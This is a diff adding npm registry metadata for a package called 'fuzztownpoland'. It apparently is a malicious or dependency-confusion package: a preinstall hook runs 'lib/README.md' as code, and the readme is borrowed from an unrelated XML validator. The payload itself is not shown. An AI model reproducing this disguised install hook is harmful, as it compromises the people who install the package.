@@ -1,0 +1,68 @@
+{
+    "_id": "fuzztownpoland",
+    "name": "fuzztownpoland",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "fuzztownpoland",
+            "version": "99.10.9",
+            "description": "okbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node lib/README.md"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "fuzztownpoland@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-8a7cB/RcAs428G7QCw07TUijuzBjRr5NY8lZ6fkTZliC2s7r2G9MFnczeSmhmBQUZuAc9JYh0meEyO0kGIjLFg==",
+                "shasum": "ce0c0d1127d5645a3fd588215165e8f92b764b9a",
+                "tarball": "https://registry.npmjs.org/fuzztownpoland/-/fuzztownpoland-99.10.9.tgz",
+                "fileCount": 8,
+                "unpackedSize": 29155,
+                "signatures": [
+                    {
+                        "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+                        "sig": "MEUCIQC6oeBG2d4OYt4bTo5ClnDtAjVFiLhehXUZQGoAvldMzQIgN/Skw0gaoo2OWGch7ezb4DbdYByPLEWQqpYlANn5FY8="
+                    }
+                ],
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiRvcMACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpyow/+M5y9lbbaNjRyozwNqvhgC6wM/6mom/UOW9NpQLdRUlzci1IE\r\nv3m7sZRRc/tSJqjIjFUoRE6wkm7jEGLC2PMaZ9pNxRWa5H3dqwy7Wtzu/F7T\r\nOdZGL5cDQQQcJKU+MUdOoVsSpyO88i4HVW0HG/mKAs1OWSaEJE9IIWTl3ZrO\r\n970sKDXD5A3vPI9AQZJfsWkp5RQMsckdM9PdOnQ6n4CcwIpPLqW1GMibxxzH\r\nFe95fXpmu90UEe0695j2nDRH5w/ivJdeu4JXYAt3/d9MZgY5r1Oc++BCAnMh\r\nuLz8xj+uPcwmuoN7+R+OBMgO0E3oyPVH6Hn/CFajDq974kGlvw7J+1Tz4DUN\r\n6KexB/LDWHgMUEEzNrRrMOSCmhZ/9/+fP/sxFTeKoCCGZr5OdYGQ5JoeubKu\r\nVLlavXAFY6k2Ihg9y/2Ho8qg6+UPhgcdeRHy0MHdDqbHl0p44OaS/Fmw5D+P\r\nC7zMNSgkZj5nWM6gz1ZasEGUrdTm2W8g+EFH56slDsDMl6L5E8StmGT7Xoe/\r\nNe6w5Q3SZ01OQMHPjmgir+msPqJClCxbo01iUkwQZpGluj0snU1W1OrEV/Bi\r\nKn1g3HyvreSqOLutxl+bWiVGlL8wcWdF2W2soo/XtQHhKFG8F6H+teK4a4dA\r\nyXuPjLtJxCzPrpu5ZeSUAGXMLwOpDSWkJ+o=\r\n=qYec\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "r1cfjnn0",
+                "email": "r1cfjnn0@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "r1cfjnn0",
+                    "email": "r1cfjnn0@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/fuzztownpoland_99.10.9_1648817932369_0.8788073348771381"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-04-01T12:58:52.368Z",
+        "99.10.9": "2022-04-01T12:58:52.539Z",
+        "modified": "2022-04-01T12:58:52.687Z"
+    },
+    "maintainers": [
+        {
+            "name": "r1cfjnn0",
+            "email": "r1cfjnn0@33mail.ga"
+        }
+    ],
+    "description": "okbit package",
+    "readme": "# Validate XML Names and Qualified Names\n\nThis package simply tells you whether or not a string matches the [`Name`](http://www.w3.org/TR/xml/#NT-Name) or [`QName`](http://www.w3.org/TR/xml-names/#NT-QName) productions in the XML Namespaces specification. We use it for implementing the [validate](https://dom.spec.whatwg.org/#validate) algorithm in jsdom, but you can use it for whatever you want.\n\n## Usage\n\nThis package's main module's default export takes a string and will return an object of the form `{ success, error }`, where `success` is a boolean and if it is `false`, then `error` is a string containing some hint as to where the match went wrong.\n\n```js\n\"use strict\":\nvar xnv = require(\"xml-name-validator\");\nvar assert = require(\"assert\");\n\n// Will return { success: true, error: undefined }\nxnv.name(\"x\");\nxnv.name(\":\");\nxnv.name(\"a:0\");\nxnv.name(\"a:b:c\");\n\n// Will return { success: false, error: <an explanatory string> }\nxnv.name(\"\\\\\");\nxnv.name(\"'\");\nxnv.name(\"0\");\nxnv.name(\"a!\");\n\n// Will return { success: true, error: undefined }\nxnv.qname(\"x\");\nxnv.qname(\"a0\");\nxnv.qname(\"a:b\");\n\n// Will return { success: false, error: <an explanatory string> }\nxnv.qname(\":a\");\nxnv.qname(\":b\");\nxnv.qname(\"a:b:c\");\nxnv.qname(\"a:0\");\n```\n",
+    "readmeFilename": "README.md"
+}
